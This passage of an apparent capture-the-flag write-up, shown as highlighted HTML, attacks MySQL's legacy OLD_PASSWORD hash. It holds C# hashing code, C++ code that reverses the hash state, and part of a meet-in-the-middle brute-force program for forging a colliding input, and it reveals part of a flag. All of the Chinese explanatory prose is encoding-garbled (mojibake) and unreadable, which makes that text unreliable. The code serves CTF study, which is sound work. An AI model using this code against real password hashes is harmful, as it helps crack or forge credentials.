(UInt32)<span class=\"number\">1</span>); <span class=\"comment\">// 111....11, 31bits</span></span><br><span class=\"line\">    result[<span class=\"number\">0</span>] = nr &amp; mask;</span><br><span class=\"line\">    result[<span class=\"number\">1</span>] = nr2 &amp; mask;</span><br><span class=\"line\">    <span class=\"built_in\">string</span> hash = String.Format(<span class=\"string\">&quot;&#123;0:X&#125;&#123;1:X&#125;&quot;</span>, result[<span class=\"number\">0</span>], result[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash.ToLower();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] args</span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine (mysql_old_password(<span class=\"string\">&quot;aaaaa&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°ï¼Œv1å’Œv2çš„hashå€¼ç¢°æ’åªéœ€è¦åŠ å…¥ç©ºæ ¼å°±å¯ä»¥ï¼šå› ä¸ºè¯¥ç®—æ³•å®Œå…¨å¿½ç•¥ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ã€‚<br>è¿™æ ·å‰ä¸€åŠflagå°±çŸ¥é“äº†ï¼š<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP</code><br>æ ¸å¿ƒé—®é¢˜åœ¨äºä½¿v2çš„hashå€¼ç­‰äº<code>6368616368613230</code>ï¼Œv2å¿…é¡»ä»¥<code>i_love_you&#125;</code>ç»“å°¾ï¼Œæˆ‘ä»¬å”¯ä¸€èƒ½æ”¹å˜çš„å°±æ˜¯ä¸­é—´çš„å­—ç¬¦ä¸²ã€‚<br>ç»è¿‡æœå¯»ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¸–å­ï¼š<a href=\"https://security.stackexchange.com/questions/3133/mysql-old-password-cryptanalysis\">mysql-old-password-cryptanalysis</a><br>é‡Œé¢ç»™å‡ºäº†ä¸€æ®µé€†å‘æ¨å¯¼nrä¸nr2çš„ä»£ç ï¼Œä»¥åŠä¸€ç¯‡åˆ†æè¯¥ç®—æ³•çš„è®ºæ–‡ï¼šF. Muller and T. Peyrin â€œCryptanalysis of T-Function-Based Hash Functionsâ€ in International Conference on Information Security and Cryptology - ICISC 2006<br>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è®ºæ–‡ä¸­çš„ç®—æ³•å’Œå®é™…ç®—æ³•æœ‰ä¸€ä¸ªå¾®å°å·®å¼‚ï¼šnr2å¯¹åº”å…¬å¼çš„<code>=</code>åº”ä¸º<code>+=</code>ã€‚<br>é€†å‘è®¡ç®—nr&#x2F;nr2ï¼š</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">pre</span><span class=\"params\">(<span class=\"type\">int</span> level = <span class=\"number\">0</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; level; i++)</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">&quot;-&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">bruteforce</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level = <span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> charset[] = <span class=\"string\">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span>; <span class=\"comment\">// sorted by ascii</span></span><br><span class=\"line\"><span class=\"comment\">//è¿™é‡Œçš„ä»£ç å‡è®¾åªæœ‰ä»¥ä¸Šå­—ç¬¦å­˜åœ¨ï¼Œäº‹å®ä¸Šå®Œå…¨æ²¡æœ‰å¿…è¦ï¼šascii 32-127éƒ½å¯ä»¥ã€‚</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">oldpw_rev</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">              <span class=\"type\">unsigned</span> <span class=\"type\">char</span> c, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level = <span class=\"number\">0</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> u, e, y;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len == <span class=\"number\">0</span> &amp;&amp; add==<span class=\"number\">7</span> &amp;&amp; pnr2==<span class=\"number\">0x12345671</span>) <span class=\"comment\">// Modify to target value when MiM-ing</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    nr = pnr;</span><br><span class=\"line\">    nr2 = pnr2;</span><br><span class=\"line\">    <span class=\"comment\">// c = cc[len - 1];</span></span><br><span class=\"line\">    add -= c;</span><br><span class=\"line\"></span><br><span class=\"line\">    u = nr2 - nr;</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    y = nr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (e = <span class=\"number\">0</span>; e &lt; <span class=\"number\">64</span>; e++)</span><br><span class=\"line\">    &#123; <span class=\"comment\">// guess 6 lsb of nr</span></span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> z, g;</span><br><span class=\"line\"></span><br><span class=\"line\">        z = (e + add) * c;</span><br><span class=\"line\">        g = (e ^ z) &amp; <span class=\"number\">0x3F</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g == (y &amp; <span class=\"number\">0x3F</span>))</span><br><span class=\"line\">        &#123; <span class=\"comment\">// must matches, otherwise reject it</span></span><br><span class=\"line\">            <span class=\"type\">uint32_t</span> x;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Now 8 LSB of nr known, byte-by-byte derive previous nr</span></span><br><span class=\"line\">            x = e;</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">bruteforce</span>(nr, nr2, add, len - <span class=\"number\">1</span>, level + <span class=\"number\">1</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                cout&lt;&lt;<span class=\"string\">&quot;assume:&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">bruteforce</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (add<span class=\"number\">-7</span>&lt;<span class=\"number\">48</span>*len||add<span class=\"number\">-7</span>&gt;<span class=\"number\">122</span>*len) <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> _=<span class=\"number\">0</span>;_&lt;<span class=\"number\">63</span>;_++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Maybeå‰ªæhere</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">oldpw_rev</span>(pnr,pnr2,add,charset[_],len,level)==<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">pre</span>(level);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;nr:%x   nr2:%x\\n&quot;</span>, pnr, pnr2);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//eg: aaaa</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0xA8D6917A</span>, pnr2 = <span class=\"number\">0x6FAB63E5</span>; <span class=\"comment\">//æœ€ç»ˆçš„nr, nr2ï¼Œæ¥è‡ªä¸Šæ–‡çš„C#ä»£ç </span></span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">bruteforce</span>(pnr, pnr2, <span class=\"number\">97</span>*<span class=\"number\">4</span> + <span class=\"number\">7</span> <span class=\"comment\">/*add*/</span>, <span class=\"number\">4</span><span class=\"comment\">/*length*/</span>) &lt;&lt; endl; <span class=\"comment\">// ! initial value of add is 7</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿå°±æ˜¯ï¼Œåœ¨å·²çŸ¥addå€¼ï¼ˆå­—ç¬¦ä¸²çš„å‰ç¼€ASCIIå’Œï¼‰ä»¥åŠå½“å‰å­—ç¬¦çš„æƒ…å†µä¸‹ï¼Œå¯¹äºå¹³å‡¡æƒ…å†µï¼ˆæ— å¤šè§£ï¼‰ï¼Œèƒ½åœ¨å¸¸æ•°æ—¶é—´ç¡®å®šä¸Šä¸€ä¸ªnr&#x2F;nr2å¯¹çš„å€¼ã€‚<br>ä¸€ä¸ªæœ´ç´ çš„æ€è·¯æ˜¯æš´åŠ›æšä¸¾å½“å‰ä½çš„å­—ç¬¦ä¸addå€¼ã€‚<br>æš´åŠ›è®¡ç®—çš„è¯æ—¶é—´å¤æ‚åº¦è‚¯å®šæ˜¯æ— æ³•æ¥å—çš„ï¼ˆO(64^n)ï¼Œ5æ­¥éœ€è¦çº¦1åˆ†é’Ÿï¼‰ã€‚æˆ‘ä»¬ç†ä¸€ä¸‹ç°åœ¨å·²çŸ¥ä»€ä¹ˆï¼Œéœ€è¦æ±‚è§£ä»€ä¹ˆã€‚è¯·æ³¨æ„ï¼šæˆ‘ä»¬éœ€è¦çš„åªæ˜¯hashç¢°æ’ï¼Œä¸ä»£è¡¨flagä¹Ÿæ˜¯ä»¥<code>i_love_you&#125;</code>ç»“å°¾çš„ã€‚</p>\n<ul>\n<li>v2çš„å½¢å¼ï¼š<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code></li>\n<li>FLAGçš„æ€»é•¿åº¦ä¸º78-79ï¼ˆå› ä¸ºå‰ä¸€åŠflagé•¿ä¸º39ï¼‰</li>\n<li>æœ€ç»ˆhash(v2)&#x3D;<code>6368616368613230</code> -&gt; æœ€ç»ˆçš„nr&#x2F;nr2</li>\n<li>å‰ä¸€åŠflagçš„addå€¼ä¸º3430ï¼š<code>sum([ord(i) for i in &quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&quot;])</code></li>\n<li>ç»“å°¾çš„11ä¸ªå­—ç¬¦<code>i_love_you&#125;</code>å¯¹åº”addå€¼ï¼š1207</li>\n<li>æœªçŸ¥ï¼šæ•´ä¸ªflagå­—ç¬¦ä¸²çš„addå€¼<ul>\n<li>ä½†addå€¼çš„å¯èƒ½èŒƒå›´å¾ˆæœ‰é™ï¼Œæˆ‘ä»¬å¯ä»¥å®¹æ˜“è®¡ç®—å‡ºä¸Šä¸‹ç•Œï¼šä¸‹ç•Œä¸º3430+39*32&#x3D;4678ï¼Œä¸Šç•Œä¸º3430+40*127&#x3D;8510</li>\n<li><strong>å¹¶ä¸”ï¼Œè¿™ä¸ªèŒƒå›´å†…åˆæ³•çš„addå€¼å æ¯”å¹¶ä¸é«˜ï¼šå¯¹äºä¸€ä¸ªå¯èƒ½çš„addå€¼ï¼Œå¾€å›æ¨ç»“å°¾çš„é‚£11ä¸ªå­—ç¬¦<code>i_love_you&#125;</code>å¿…é¡»éƒ½æœ‰è§£</strong></li>\n</ul>\n</li>\n</ul>\n<p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦MitMï¼Œä¸­é—´ç›¸é‡ï¼Œå³å¯çˆ†å‡ºæ­£è§£ã€‚<br>è¿™ä¸ªä¸­é—´çŠ¶æ€æŒ‡çš„æ˜¯<code>&lt;???&gt;</code>è¿™ä¸²æœªçŸ¥å­—ä¸²ä¸­é—´æŸä¸ªä½ç½®ä¸€ä¸ªç‹¬ç‰¹çš„nr&#x2F;nr2&#x2F;addå¯¹ï¼›è€Œè¿™ä¸ªaddå€¼æ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªä¸­é—´é‡ï¼ˆ<strong>ä¸‹ç§°fadd</strong>ï¼‰ï¼Œå¯ä»¥æ‰‹åŠ¨ç»™äºˆä¸€ä¸ªå€¼ã€‚åœ¨æœ¬é¢˜ä¸­æˆ‘ä»¬æ‰‹åŠ¨è¦æ±‚ä»<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code>å†å‘å‰å¡«å……æ€»è®¡<code>6*127</code>çš„å­—ç¬¦ä½œä¸ºä¸­é—´ç›¸é‡å¤„ï¼šå½“ç„¶è¶Šå¤§çš„å€¼æœç´¢ç©ºé—´è¶Šå¤§ã€‚  </p>\n<ol>\n<li>æˆ‘ä»¬å…ˆç­›é€‰å‡ºå¯è¡Œçš„addå€¼ï¼Œå¹¶è®°å½•åœ¨å¤„ç†<code>i_love_you&#125;</code>å‰çš„ä¸­é—´addå€¼</li>\n<li>é€†å‘: å¯¹äºæ¯ä¸ªä¸­é—´addå€¼å…ˆé€†æ¨5æ­¥ï¼Œè®°å½•æ‰€æœ‰å¯èƒ½åœ¨ä¸­é—´ç›¸é‡å¤„addå€¼ä¸ºfaddçš„nr&#x2F;nr2å¯¹ï¼Œä»¥åŠé€†å‘å¯¹åº”çš„5ä¸ªå­—ç¬¦</li>\n<li>æ­£å‘: æˆ‘ä»¬æ‰‹åŠ¨è¦æ±‚å‘å‰æ•°æ­¥ï¼ˆè‡³å°‘6æ­¥ï¼Œå› ä¸ºfaddå€¼æ˜¯3430+6*127ï¼‰åˆ°è¾¾ä¸­é—´ç›¸é‡å¤„ä½¿å¾—addå€¼ä¸ºfaddï¼Œå¹¶æ£€æŸ¥è¿™ä¸ªnr&#x2F;nr2å¯¹æ˜¯å¦å‡ºç°åœ¨é€†å‘å¾—åˆ°çš„ç»“æœä¸­ï¼›å¦‚æœæœ‰ï¼Œåˆ™æ‹¿ä¸‹ã€‚<br>çˆ†ç ´ä»£ç ï¼šCredit to @4qwerty<br>ä¸ºä»€ä¹ˆforåµŒå¥—è¿™ä¹ˆå¤šï¼Ÿå› ä¸º4è€å¸ˆæ‡’å¾—å†™é€’å½’ï¼Œåæ­£æ²¡å‡ æ­¥ï¼Œä¸å¤Ÿå°±åŠ ä¸€å±‚forå°±è¡Œäº†ã€‚<br>å…¶å®å¦‚æœè¦è®¡ç®—çš„è¯æ˜¯å¯ä»¥çš„ï¼šé€†ç€5æ­¥å¤§çº¦æœ‰<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stddef.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;thread&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;mutex&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unordered_map&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;atomic&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">oldpw_rev</span><span class=\"params\">(<span class=\"type\">uint32_t</span> *pnr, <span class=\"type\">uint32_t</span> *pnr2, <span class=\"type\">uint32_t</span> add,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> c, u, e, y;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    nr = *pnr;</span><br><span class=\"line\">    nr2 = *pnr2;</span><br><span class=\"line\">    c = cc[len - <span class=\"number\">1</span>];</span><br><span class=\"line\">    add -= c;</span><br><span class=\"line\"></span><br><span class=\"line\">    u = nr2 - nr;</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    y = nr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (e = <span class=\"number\">0</span>; e &lt; <span class=\"number\">64</span>; e ++) &#123;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> z, g;</span><br><span class=\"line\"></span><br><span class=\"line\">        z = (e + add) * c;</span><br><span class=\"line\">        g = (e ^ z) &amp; <span class=\"number\">0x3F</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g == (y &amp; <span class=\"number\">0x3F</span>)) &#123;</span><br><span class=\"line\">            <span class=\"type\">uint32_t</span> x;</span><br><span class=\"line\"></span><br><span class=\"line\">            x = e;</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">oldpw_rev</span>(&amp;nr, &amp;nr2, add, cc, len - <span class=\"number\">1</span>) == <span class=\"number\">0</span>) &#123;</span><br><span 